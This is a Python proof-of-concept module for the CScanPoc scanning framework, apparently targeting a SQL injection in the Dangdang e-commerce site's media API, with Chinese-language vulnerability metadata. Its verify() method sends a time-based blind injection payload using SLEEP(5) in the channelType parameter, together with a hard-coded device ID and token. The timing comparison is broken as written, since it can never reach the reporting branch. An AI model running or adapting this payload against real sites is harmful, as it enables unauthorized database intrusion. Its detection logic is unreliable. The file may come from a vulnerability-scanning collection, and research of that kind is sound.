# coding:utf-8
import time
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Dangdang_0102'  # 平台漏洞编号
    name = '当当网存在sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-24'  # 漏洞公布时间
    desc = '''
    当当网存在sql注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=206879
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Dangdang'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '06e2dad9-4a80-4940-937f-a44111c2b2f2'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/media/api2.go?action=specialtopichistory&channelId=70000&channelType=') AND (SELECT * FROM (SELECT(SLEEP(5)))duhD) AND ('gpvJ'='gpvJ&clientVersionNo=5.0.0&deviceSerialNo=html5&deviceType=DDDS_All&deviceType=pconline&end=4&&fromPlatform=106&macAddr=html5&permanentId=20160509141255496945873539944433574&platformSource=DDDS-P&returnType=json&start=0&token=fef3aeb74b5355da8068e7cdff8ca7c4"
            payload1 = "/media/api2.go?action=specialtopichistory&channelId=70000&channelType=aa&clientVersionNo=5.0.0&deviceSerialNo=html5&deviceType=DDDS_All&deviceType=pconline&end=4&&fromPlatform=106&macAddr=html5&permanentId=20160509141255496945873539944433574&platformSource=DDDS-P&returnType=json&start=0&token=fef3aeb74b5355da8068e7cdff8ca7c4"

            url = self.target + payload
            start_time1 = time.time()
            _response = requests.get(url)

            url = self.target + payload1
            end_time1 = time.time()
            _response = requests.get(url)
            end_time2 = time.time()
            if (end_time1-start_time1) - (end_time2-start_time1) >= 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
